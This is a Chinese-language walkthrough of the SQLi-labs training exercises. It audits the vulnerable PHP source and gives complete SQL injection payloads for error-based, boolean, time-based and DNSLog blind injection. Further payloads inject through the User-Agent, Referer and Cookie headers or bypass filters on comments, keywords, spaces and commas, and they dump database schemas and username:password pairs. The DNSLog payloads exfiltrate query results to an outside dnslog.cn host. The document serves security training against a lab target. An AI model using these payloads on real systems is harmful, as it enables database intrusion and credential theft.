<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230606185331437.png" alt="image-20230606185331437" style="zoom:50%;" />

#### 爆表

```
passwd=123') and extractvalue(0x7e, concat(0x7e, (select substring((group_concat(table_name)),1,30) from information_schema.tables where table_schema=database())))#&Submit=Submit&uname=admin
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230606190000741.png" alt="image-20230606190000741" style="zoom:50%;" />

#### 爆字段

```
passwd=123') and extractvalue(0x7e, concat(0x7e, (select substring((group_concat(column_name)),1,30) from information_schema.columns where table_schema=database() and table_name='users')))#&Submit=Submit&uname=admin
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230606190045141.png" alt="image-20230606190045141" style="zoom:50%;" />

#### 拖库

```
passwd=123') and extractvalue(0x7e, concat(0x7e, (select substring((group_concat(username,":",password)),1,30) from users)))#&Submit=Submit&uname=admin
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230606190137960.png" alt="image-20230606190137960" style="zoom:50%;" />

## POST注入-盲注

### 布尔盲注-Less-15

```
# 爆表
passwd=123' or ascii(substring((select table_name from information_schema.tables where table_schema=database() limit 1,1), 1,1)) <= 115
#&Submit=Submit
&uname=123
# 爆字段
passwd=123' or ascii(substring((select column_name from information_schema.columns where table_schema=database() and table_name='users' limit 1,1), 1,1)) >= 115
#&Submit=Submit
&uname=123
# 爆值
passwd=123' or ascii(substring((select username from users limit 1,1), 1,1)) <= 115
#&Submit=Submit
&uname=123
```

### 时间盲注-Less-15

```
# 爆表
passwd=123' or if(ascii(substring((select table_name from information_schema.tables where table_schema=database() limit 1,1), 1,1)) <= 115,sleep(0),sleep(3))#&Submit=Submit
&uname=123
# 爆字段
passwd=123' or if(ascii(substring((select column_name from information_schema.columns where table_schema=database() and table_name='users' limit 1,1), 1,1)) <= 115,sleep(0),sleep(3))#&Submit=Submit
&uname=123
# 爆值
passwd=123' or if(ascii(substring((select username from users limit 1,1), 1,1)) <= 115,sleep(0),sleep(3))#&Submit=Submit&uname=123
```

### DNSLog盲注-Less-15

```
# 查看当前数据库
passwd=123' and (select load_file(concat("//", (select database()), ".2vajg1.dnslog.cn/asa")))#&Submit=Submit&uname=admin
# 爆表
passwd=123' and (select load_file(concat("//", (select table_name from information_schema.tables where table_schema=database() limit 1,1), ".2vajg1.dnslog.cn/asa")))#&Submit=Submit&uname=admin
# 爆字段
passwd=123' and (select load_file(concat("//", (select column_name from information_schema.columns where table_schema=database() and table_name='users' limit 1,1), ".2vajg1.dnslog.cn/asa")))#&Submit=Submit&uname=admin
# 爆值
passwd=123' and (select load_file(concat("//", (select username from users limit 1,1), ".2vajg1.dnslog.cn/asa")))#&Submit=Submit&uname=admin
passwd=123' and (select load_file(concat("//", (select password from users limit 1,1), ".2vajg1.dnslog.cn/asa")))#&Submit=Submit&uname=admin
```

## POST注入-UserAgent注入

> 有关于所有利用头部标签来注入的，基本都需要靠白盒测试

### 注入原理

后台获取HTTP头的UserAgent信息，并没有做安全过滤，直接写入数据库！任何于数据库交互的地方都有可能出现SQL注入

#### 源码审计

```php
<?php
        //including the Mysql connect parameters.
        include("../sql-connections/sql-connect.php");
        error_reporting(0);
		
		# 对输出进行转义实体化函数
        function check_input($value)
        {
            if (!empty($value)) {
                // truncation (see comments)
                $value = substr($value, 0, 20);
            }

            // Stripslashes if magic quotes enabled
            if (get_magic_quotes_gpc()) {
                $value = stripslashes($value);
            }

            // Quote if not a number
            if (!ctype_digit($value)) {
                $value = "'" . mysql_real_escape_string($value) . "'";
            } else {
                $value = intval($value);
            }
            return $value;
        }

		# 获取User-Agent
        $uagent = $_SERVER['HTTP_USER_AGENT'];
		# 获取IP地址
        $IP = $_SERVER['REMOTE_ADDR'];
        echo "<br>";
        echo 'Your IP ADDRESS is: ' . $IP;
        echo "<br>";
        //echo 'Your User Agent is: ' .$uagent;
        // take the variables
        if (isset($_POST['uname']) && isset($_POST['passwd'])) {
            # 对username和password都进行了实体化，没有办法注入
            $uname = check_input($_POST['uname']);
            $passwd = check_input($_POST['passwd']);

            /*
            echo 'Your Your User name:'. $uname;
            echo "<br>";
            echo 'Your Password:'. $passwd;
            echo "<br>";
            echo 'Your User Agent String:'. $uagent;
            echo "<br>";
            echo 'Your User Agent String:'. $IP;
            */

            //logging the connection parameters to a file for analysis.	
            $fp = fopen('result.txt', 'a');
            fwrite($fp, 'User Agent:' . $uname . "\n");

            fclose($fp);

			# 与数据库进行了交互，但是username和password都进行了转义处理，无法利用
            $sql = "SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1";
            $result1 = mysql_query($sql);
            $row1 = mysql_fetch_array($result1);
            # 只有成功登录才能触发下面的代码，否则程序执行完毕
            if ($row1) {
                echo '<font color= "#FFFF00" font size = 3 >';
                # 与数据库进行了交互，可以发现没有对”User-Agent“做任何安全过滤，所以$uagent是注入点
                # $IP是在传输层获取的，值的获取并非来自HTTP头部，所以无法利用
                $insert = "INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('$uagent', '$IP', $uname)";
                mysql_query($insert);
                //echo 'Your IP ADDRESS is: ' .$IP;
                echo "</font>";
                //echo "<br>";
                echo '<font color= "#0000ff" font size = 3 >';
                echo 'Your User Agent is: ' . $uagent;
                echo "</font>";
                echo "<br>";
                print_r(mysql_error());
                echo "<br><br>";
                echo '<img src="../images/flag.jpg"  />';
                echo "<br>";

            } else {
                echo '<font color= "#0000ff" font size="3">';
                //echo "Try again looser";
                print_r(mysql_error());
                echo "</br>";
                echo "</br>";
                echo '<img src="../images/slap.jpg"   />';
                echo "</font>";
            }

        }

        ?>
```

#### 本地数据库尝试

对于insert语句，任然可以做报错注入，成功获取到数据库信息

```bash
mysql> INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('1' or extractvalue(0x7e, concat(0x7e, (select database()))), '2', 3);# ', '2', '3');
ERROR 1105 (HY000): XPATH syntax error: '~security'
```

### 注入流程-Less-18

==**要想成功复现，必须先成功登录**==

#### 获取当前数据库名

```
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36' and extractvalue(0x7e, concat(0x7e, (select database()))), '2', 3)#
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230606225942197.png" alt="image-20230606225942197" style="zoom:50%;" />

#### 爆库

```
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36' and extractvalue(0x7e, concat(0x7e, (select schema_name from information_schema.schemata limit 1,1))), '2', 3)#
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230606230248421.png" alt="image-20230606230248421" style="zoom:50%;" />

#### 爆表

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230606230358678.png" alt="image-20230606230358678" style="zoom:50%;" />

#### 爆字段

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230606230508282.png" alt="image-20230606230508282" style="zoom:50%;" />

#### 拖库

```
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36' and extractvalue(0x7e, concat(0x7e, (select concat(username,':',password) from users limit 1,1))), '2', 3)#
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230606230637531.png" alt="image-20230606230637531" style="zoom:50%;" />

## POST注入-Referer注入

### 注入原理

与User-Agent注入原理一样，操作也一样，只是注入的地方不同

#### 源码审计

```php
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
        "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
    <title>Less-19 Header Injection- Referer- Error Based- string</title>
</head>

<body bgcolor="#000000">

<div style=" margin-top:20px;color:#FFF; font-size:24px; text-align:center"> Welcome&nbsp;&nbsp;&nbsp;<font
            color="#FF0000"> Dhakkan </font><br></div>
<div align="center"
     style="margin:20px 0px 0px 510px;border:20px; background-color:#0CF; text-align:center;width:400px; height:150px;">
    <div style="padding-top:10px; font-size:15px;">


        <!--Form to post the contents -->
        <form action="" name="form1" method="post">

            <div style="margin-top:15px; height:30px;">Username : &nbsp;&nbsp;&nbsp;
                <input type="text" name="uname" value=""/></div>

            <div> Password : &nbsp; &nbsp;
                <input type="text" name="passwd" value=""/></div>
            </br>
            <div style=" margin-top:9px;margin-left:90px;"><input type="submit" name="submit" value="Submit"/></div>
        </form>
    </div>
</div>
<div style=" margin-top:10px;color:#FFF; font-size:23px; text-align:center">
    <font size="3" color="#FFFF00">


        <?php
        //including the Mysql connect parameters.
        include("../sql-connections/sql-connect.php");
        error_reporting(0);

        function check_input($value)
        {
            if (!empty($value)) {
                // truncation (see comments)
                $value = substr($value, 0, 20);
            }

            // Stripslashes if magic quotes enabled
            if (get_magic_quotes_gpc()) {
                $value = stripslashes($value);
            }

            // Quote if not a number
            if (!ctype_digit($value)) {
                $value = "'" . mysql_real_escape_string($value) . "'";
            } else {
                $value = intval($value);
            }
            return $value;
        }


        $uagent = $_SERVER['HTTP_REFERER'];
        $IP = $_SERVER['REMOTE_ADDR'];
        echo "<br>";
        echo 'Your IP ADDRESS is: ' . $IP;
        echo "<br>";
        //echo 'Your User Agent is: ' .$uagent;
        // take the variables
        if (isset($_POST['uname']) && isset($_POST['passwd'])) {
            $uname = check_input($_POST['uname']);
            $passwd = check_input($_POST['passwd']);

            /*
            echo 'Your Your User name:'. $uname;
            echo "<br>";
            echo 'Your Password:'. $passwd;
            echo "<br>";
            echo 'Your User Agent String:'. $uagent;
            echo "<br>";
            echo 'Your User Agent String:'. $IP;
            */

            //logging the connection parameters to a file for analysis.
            $fp = fopen('result.txt', 'a');
            fwrite($fp, 'Referer:' . $uname . "\n");

            fclose($fp);


            $sql = "SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1";
            $result1 = mysql_query($sql);
            $row1 = mysql_fetch_array($result1);
            # 只有先登录成功才能触法注入点
            if ($row1) {
                echo '<font color= "#FFFF00" font size = 3 >';
                # 可以看到并没有对变量 $uagent 做任何的安全过滤
                $insert = "INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES ('$uagent', '$IP')";
                mysql_query($insert);
                //echo 'Your IP ADDRESS is: ' .$IP;
                echo "</font>";
                //echo "<br>";
                echo '<font color= "#0000ff" font size = 3 >';
                echo 'Your Referer is: ' . $uagent;
                echo "</font>";
                echo "<br>";
                print_r(mysql_error());
                echo "<br><br>";
                echo '<img src="../images/flag.jpg" />';
                echo "<br>";

            } else {
                echo '<font color= "#0000ff" font size="3">';
                //echo "Try again looser";
                print_r(mysql_error());
                echo "</br>";
                echo "</br>";
                echo '<img src="../images/slap.jpg"  />';
                echo "</font>";
            }

        }

        ?>


    </font>
</div>
</body>
</html>
```

#### 本地数据库尝试

```
mysql> INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES ('1' and extractvalue(1,concat(0x7e, (select database()))), '2');#', '2');
ERROR 1105 (HY000): XPATH syntax error: '~security'
```

### 注入流程-Less-19

#### 查看当前数据库

```
Referer: http://192.168.231.129:9001/Less-19/' and extractvalue(1,concat(0x7e, (select database()))), '2')#
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230606233901505.png" alt="image-20230606233901505" style="zoom:50%;" />

#### 爆库

```
Referer: http://192.168.231.129:9001/Less-19/' and extractvalue(1,concat(0x7e, (select schema_name from information_schema.schemata limit 4,1))), '2')#
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230606234013256.png" alt="image-20230606234013256" style="zoom:50%;" />

#### 爆表

```
Referer: http://192.168.231.129:9001/Less-19/' and extractvalue(1,concat(0x7e, (select table_name from information_schema.tables where table_schema=database() limit 1,1))), '2')#
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230606234238850.png" alt="image-20230606234238850" style="zoom:50%;" />

#### 爆字段

```
Referer: http://192.168.231.129:9001/Less-19/' and extractvalue(1,concat(0x7e, (select column_name from information_schema.columns where table_schema=database() and table_name='users' limit 1,1))), '2')#
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230606234322880.png" alt="image-20230606234322880" style="zoom:50%;" />

#### 拖库

```
Referer: http://192.168.231.129:9001/Less-19/' and extractvalue(1,concat(0x7e, (select concat(username,':',password) from users limit 1,1))), '2')#
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230606234532761.png" alt="image-20230606234532761" style="zoom:50%;" />

## POST注入-Cookie注入

### 注入原理

#### 源码审计

```php
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
        "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>

    <title>Less-20 Cookie Injection- Error Based- string</title>
</head>

<body bgcolor="#000000">
<?php
//including the Mysql connect parameters.
include("../sql-connections/sql-connect.php");
error_reporting(0);
if (!isset($_COOKIE['uname'])) {
    //including the Mysql connect parameters.
    include("../sql-connections/sql-connect.php");

    echo "<div style=' margin-top:20px;color:#FFF; font-size:24px; text-align:center'> Welcome&nbsp;&nbsp;&nbsp;<font color='#FF0000'> Dhakkan </font><br></div>";
    echo "<div  align='center' style='margin:20px 0px 0px 510px;border:20px; background-color:#0CF; text-align:center;width:400px; height:150px;'>";
    echo "<div style='padding-top:10px; font-size:15px;'>";


    echo "<!--Form to post the contents -->";
    echo '<form action=" " name="form1" method="post">';

    echo ' <div style="margin-top:15px; height:30px;">Username : &nbsp;&nbsp;&nbsp;';
    echo '   <input type="text"  name="uname" value=""/>  </div>';

    echo ' <div> Password : &nbsp; &nbsp; &nbsp;';
    echo '   <input type="text" name="passwd" value=""/></div></br>';
    echo '   <div style=" margin-top:9px;margin-left:90px;"><input type="submit" name="submit" value="Submit" /></div>';

    echo '</form>';
    echo '</div>';
    echo '</div>';
    echo '<div style=" margin-top:10px;color:#FFF; font-size:23px; text-align:center">';
    echo '<font size="3" color="#FFFF00">';
    echo '<center><br><br><br>';
    echo '<img src="../images/Less-20.jpg" />';
    echo '</center>';


    function check_input($value)
    {
        if (!empty($value)) {
            $value = substr($value, 0, 20); // truncation (see comments)
        }
        if (get_magic_quotes_gpc())  // Stripslashes if magic quotes enabled
        {
            $value = stripslashes($value);
        }
        if (!ctype_digit($value))    // Quote if not a number
        {
            $value = "'" . mysql_real_escape_string($value) . "'";
        } else {
            $value = intval($value);
        }
        return $value;
    }


    echo "<br>";
    echo "<br>";

    if (isset($_POST['uname']) && isset($_POST['passwd'])) {

        $uname = check_input($_POST['uname']);
        $passwd = check_input($_POST['passwd']);


        $sql = "SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1";
        $result1 = mysql_query($sql);
        $row1 = mysql_fetch_array($result1);
        $cookee = $row1['username'];
        if ($row1) {
            echo '<font color= "#FFFF00" font size = 3 >';
            setcookie('uname', $cookee, time() + 3600);
            header('Location: index.php');
            echo "I LOVE YOU COOKIES";
            echo "</font>";
            echo '<font color= "#0000ff" font size = 3 >';
            //echo 'Your Cookie is: ' .$cookee;
            echo "</font>";
            echo "<br>";
            print_r(mysql_error());
            echo "<br><br>";
            echo '<img src="../images/flag.jpg" />';
            echo "<br>";
        } else {
            echo '<font color= "#0000ff" font size="3">';
            //echo "Try again looser";
            print_r(mysql_error());
            echo "</br>";
            echo "</br>";
            echo '<img src="../images/slap.jpg" />';
            echo "</font>";
        }
    }

    echo "</font>";
    echo '</font>';
    echo '</div>';

} else {


    if (!isset($_POST['submit'])) {

        $cookee = $_COOKIE['uname'];
        $format = 'D d M Y - H:i:s';
        $timestamp = time() + 3600;
        echo "<center>";
        echo '<br><br><br>';
        echo '<img src="../images/Less-20.jpg" />';
        echo "<br><br><b>";
        echo '<br><font color= "red" font size="4">';
        echo "YOUR USER AGENT IS : " . $_SERVER['HTTP_USER_AGENT'];
        echo "</font><br>";
        echo '<font color= "cyan" font size="4">';
        echo "YOUR IP ADDRESS IS : " . $_SERVER['REMOTE_ADDR'];
        echo "</font><br>";
        echo '<font color= "#FFFF00" font size = 4 >';
        echo "DELETE YOUR COOKIE OR WAIT FOR IT TO EXPIRE <br>";
        echo '<font color= "orange" font size = 5 >';
        echo "YOUR COOKIE : uname = $cookee and expires: " . date($format, $timestamp);


        echo "<br></font>";
        # 注入点在这里，由于使用的是 SELECT 语句，所以这里可以使用UNION注入和报错注入
        $sql = "SELECT * FROM users WHERE username='$cookee' LIMIT 0,1";
        $result = mysql_query($sql);
        if (!$result) {
            die('Issue with your mysql: ' . mysql_error());
        }
        $row = mysql_fetch_array($result);
        if ($row) {
            echo '<font color= "pink" font size="5">';
            echo 'Your Login name:' . $row['username'];
            echo "<br>";
            echo '<font color= "grey" font size="5">';
            echo 'Your Password:' . $row['password'];
            echo "</font></b>";
            echo "<br>";
            echo 'Your ID:' . $row['id'];
        } else {
            echo "<center>";
            echo '<br><br><br>';
            echo '<img src="../images/slap1.jpg" />';
            echo "<br><br><b>";
            //echo '<img src="../images/Less-20.jpg" />';
        }
        echo '<center>';
        echo '<form action="" method="post">';
        echo '<input  type="submit" name="submit" value="Delete Your Cookie!" />';
        echo '</form>';
        echo '</center>';
    } else {
        echo '<center>';
        echo "<br>";
        echo "<br>";
        echo "<br>";
        echo "<br>";
        echo "<br>";
        echo "<br>";
        echo '<font color= "#FFFF00" font size = 6 >';
        echo " Your Cookie is deleted";
        setcookie('uname', $row1['username'], time() - 3600);
        header('Location: index.php');
        echo '</font></center></br>';

    }


    echo "<br>";
    echo "<br>";
    //header ('Location: main.php');
    echo "<br>";
    echo "<br>";

    //echo '<img src="../images/slap.jpg" /></center>';
    //logging the connection parameters to a file for analysis.
    $fp = fopen('result.txt', 'a');
    fwrite($fp, 'Cookie:' . $cookee . "\n");

    fclose($fp);

}
?>

</body>
</html>
```

### 注入流程-Less-20

#### 爆库

```
Cookie: uname=admin' and extractvalue(1,concat(0x7e, (select schema_name from information_schema.schemata limit 1,1)))#
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230607131436241.png" alt="image-20230607131436241" style="zoom:50%;" />

#### 爆表

```
Cookie: uname=' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()#
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230607131709364.png" alt="image-20230607131709364" style="zoom:50%;" />

#### 爆字段

```
Cookie: uname=' union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'#
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230607131806885.png" alt="image-20230607131806885" style="zoom:50%;" />

#### 拖库

```
Cookie: uname=' union select 1,2,group_concat(username,':',password) from users#
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230607131942154.png" alt="image-20230607131942154" style="zoom: 50%;" />

## 注释符过滤的绕过

### 过滤原理

#### 源码审计

这里没办法做双写绕过，所以只能想办法闭合掉最后的一个单引号

```php
# 注释符过滤，将所有的注释符替换为空
//filter the comments out so as to comments should not work
$reg = "/#/";
$reg1 = "/--/";
$replace = "";
$id = preg_replace($reg, $replace, $id);
$id = preg_replace($reg1, $replace, $id);

$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
$result=mysql_query($sql);
$row = mysql_fetch_array($result);
```

### 注入流程-Less-23

#### 尝试注释符绕过

可以发现成功绕过，并得到报错信息

```
http://192.168.231.129:9001/Less-23/?id=' union select 1,2,3,4 or '1'='1
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230607133614106.png" alt="image-20230607133614106" style="zoom: 33%;" />

#### 寻找回显位

```
http://192.168.231.129:9001/Less-23/?id=' union select 1,2,3 or '1'='1
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230607133738158.png" alt="image-20230607133738158" style="zoom: 33%;" />

#### 查看当前数据库

```
http://192.168.231.129:9001/Less-23/?id=' union select 1,database(),3 or '2'='2
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230607133833450.png" alt="image-20230607133833450" style="zoom: 33%;" />

#### 爆库

使用UNION + where 的方式完成

```
http://192.168.231.129:9001/Less-23/?id=' union select 1,group_concat(username,':',password),3  from users where '1'='1
```



这里使用别名的方式，起一个别名`'2'`来闭合后面的单引号

```
http://192.168.231.129:9001/Less-23/?id=' union select 1,group_concat(schema_name),3 as '2' from information_schema.schemata group by '2
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230607134310968.png" alt="image-20230607134310968" style="zoom: 33%;" />

#### 爆表

```
http://192.168.231.129:9001/Less-23/?id=' union select 1,group_concat(table_name),3 as '2' from information_schema.tables where table_schema=database() group by '2
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230607134353199.png" alt="image-20230607134353199" style="zoom: 33%;" />

#### 拖库

```
http://192.168.231.129:9001/Less-23/?id=' union select 1,group_concat(column_name),3 as '2' from information_schema.columns where table_schema=database() and table_name='users' group by '2
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230607134510375.png" alt="image-20230607134510375" style="zoom: 33%;" />

#### 拖库

```
http://192.168.231.129:9001/Less-23/?id=' union select 1,group_concat(username,':',password),3 as '2' from users group by '2
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230607134551039.png" alt="image-20230607134551039" style="zoom: 33%;" />

## and和or的绕过

### 常见绕过手法

```
# 使用大小写绕过
?id=1 AnD 1=1--+
# 双写绕过
?id=1 aandnd 1=1 --+
# 用&&取代and，用||取代or
?id=1' && 1=1 --+
```

### 注入原理

#### 源码审计

这里很明显只对大小写进行了过滤，典型的双写绕过代码

```php
function blacklist($id)
{
	$id= preg_replace('/or/i',"", $id);			//strip out OR (non case sensitive)
	$id= preg_replace('/AND/i',"", $id);		//Strip out AND (non case sensitive)
	
	return $id;
}
```

### 注入流程-Less-25

#### 查看当前数据库

```
http://192.168.231.129:9001/Less-25/?id=0' union select 1,database(),3%23
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230607142042185.png" alt="image-20230607142042185" style="zoom: 33%;" />

#### 爆库

这里因为 information 这个单词包含了or，所以中间也要做双写

```
http://192.168.231.129:9001/Less-25/?id=0' union select 1,group_concat(schema_name),3 from infoorrmation_schema.schemata%23
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230607142207745.png" alt="image-20230607142207745" style="zoom: 33%;" />

#### 爆表

```
http://192.168.231.129:9001/Less-25/?id=0' union select 1,group_concat(table_name),3 from infoorrmation_schema.tables where table_schema=database()%23
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230607142247220.png" alt="image-20230607142247220" style="zoom: 33%;" />

#### 爆字段

```
http://192.168.231.129:9001/Less-25/?id=0' union select 1,group_concat(column_name),3 from infoorrmation_schema.columns where table_schema=database() aandnd table_name='users'%23
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230607142429038.png" alt="image-20230607142429038" style="zoom: 33%;" />

#### 拖库

```
http://192.168.231.129:9001/Less-25/?id=0' union select 1,group_concat(username,':',passwoorrd),3 from users%23
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230607142535109.png" alt="image-20230607142535109" style="zoom: 33%;" />

## 空格绕过

### 绕过手法

1. 使用 + 号代替空格

2. 使用URL编码代替空格

   ```
   spaces -------------------- %20
   TAB 09 horizontal TAB ----- %09
   LF OA newline ------------- %0A
   F 0C new page ------------- %0C
   CR 0D carriage return ----- %0D
   VT 0B vertival TAB -------- %0B
   -OA-(MySQL only) ---------- %0A
   ```

### 注入原理

#### 代码审计

源码中对下面的字符串都做了空的替换

```
function blacklist($id)
{
	$id= preg_replace('/or/i',"", $id);			//strip out OR (non case sensitive)
	$id= preg_replace('/and/i',"", $id);		//Strip out AND (non case sensitive)
	$id= preg_replace('/[\/\*]/',"", $id);		//strip out /*
	$id= preg_replace('/[--]/',"", $id);		//Strip out --
	$id= preg_replace('/[#]/',"", $id);			//Strip out #
	$id= preg_replace('/[\s]/',"", $id);		//Strip out spaces
	$id= preg_replace('/[\/\\\\]/',"", $id);		//Strip out slashes
	return $id;
}
```

### 注入流程-Less-26

#### 尝试绕过空格

正常回显，成功绕过

```
http://192.168.231.129:9001/Less-26/?id=0'%0Boorr'1'='1
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230607145645271.png" alt="image-20230607145645271" style="zoom: 33%;" />

#### 判断回显位

```
http://192.168.231.129:9001/Less-26/?id=0'%0Bunion%0Bselect%0B1,2,3%0Boorr%0B'1'='1
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230607145730891.png" alt="image-20230607145730891" style="zoom: 33%;" />

#### 查看当前数据库名

```
http://192.168.231.129:9001/Less-26/?id=0'%0Bunion%0Bselect%0B1,database(),3%0Boorr%0B'1'='1
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230607145830944.png" alt="image-20230607145830944" style="zoom: 33%;" />

#### 爆库

```
http://192.168.231.129:9001/Less-26/?id=0'%0Bunion%0Bselect%0B1,group_concat(schema_name),3%0Bfrom%0Binfoorrmation_schema.schemata%0Bwhere%0B'1'='1
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230607150009196.png" alt="image-20230607150009196" style="zoom: 33%;" />

#### 爆表

```
http://192.168.231.129:9001/Less-26/?id=0'%0Bunion%0Bselect%0B1,group_concat(table_name),3%0Bfrom%0Binfoorrmation_schema.tables%0Bwhere%0Btable_schema=database()%0Baandnd%0B'1'='1
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230607150250397.png" alt="image-20230607150250397" style="zoom: 33%;" />

#### 爆字段

```
http://192.168.231.129:9001/Less-26/?id=0'%0Bunion%0Bselect%0B1,group_concat(column_name),3%0Bfrom%0Binfoorrmation_schema.columns%0Bwhere%0Btable_schema=database()%0Banandd%0Btable_name='users'%0Baandnd%0B'1'='1
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230607150349267.png" alt="image-20230607150349267" style="zoom: 33%;" />

#### 拖库

```
http://192.168.231.129:9001/Less-26/?id=0'%0Bunion%0Bselect%0B1,group_concat(username,':',passwoorrd),3%0Bfrom%0Busers%0Bwhere%0B'1'='1
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230607150507387.png" alt="image-20230607150507387" style="zoom: 33%;" />

## 逗号绕过

### 前置知识

#### `join()`函数

原理：

1. 从第一张表依次取出每一条记录
2. 取出每一条记录之后，与另外一种表的全部记录挨个匹配
3. 没有任何匹配条件，所有的结果全都会进行保留

```
mysql> select u.*,e.* from users as u join emails as e on e.id=u.id;
+----+----------+------------+----+------------------------+
| id | username | password   | id | email_id               |
+----+----------+------------+----+------------------------+
|  1 | Dumb     | Dumb       |  1 | Dumb@dhakkan.com       |
|  2 | Angelina | I-kill-you |  2 | Angel@iloveu.com       |
|  3 | Dummy    | p@ssword   |  3 | Dummy@dhakkan.local    |
|  4 | secure   | crappy     |  4 | secure@dhakkan.local   |
|  5 | stupid   | stupidity  |  5 | stupid@dhakkan.local   |
|  6 | superman | genious    |  6 | superman@dhakkan.local |
|  7 | batman   | mob!le     |  7 | batman@dhakkan.local   |
|  8 | admin    | admin      |  8 | admin@dhakkan.com      |
+----+----------+------------+----+------------------------+
8 rows in set (0.01 sec)
```

配合UNION查询使用

```
mysql> select * from users where id=1 union select * from (select 1)a join (select 2)b join (select 3)c;
+----+----------+----------+
| id | username | password |
+----+----------+----------+
|  1 | Dumb     | Dumb     |
|  1 | 2        | 3        |
+----+----------+----------+
2 rows in set (0.01 sec)
```

### 注入流程-Less-1

#### 判断回显点

在做这一步之前应该先判断查询列数，这里偷懒了

```
http://192.168.231.129:9001/Less-1/?id=0' union select * from (select 1)a join (select 2)b join (select 3)c%23
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230607152842645.png" alt="image-20230607152842645" style="zoom: 33%;" />

#### 爆库

```
http://192.168.231.129:9001/Less-1/?id=0' union select * from (select 1)a join (select group_concat(schema_name) from information_schema.schemata)b join (select 3)c%23
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230607152951844.png" alt="image-20230607152951844" style="zoom: 33%;" />

#### 爆表

```
http://192.168.231.129:9001/Less-1/?id=0' union select * from (select 1)a join (select group_concat(table_name) from information_schema.tables where table_schema=database())b join (select 3)c%23
```

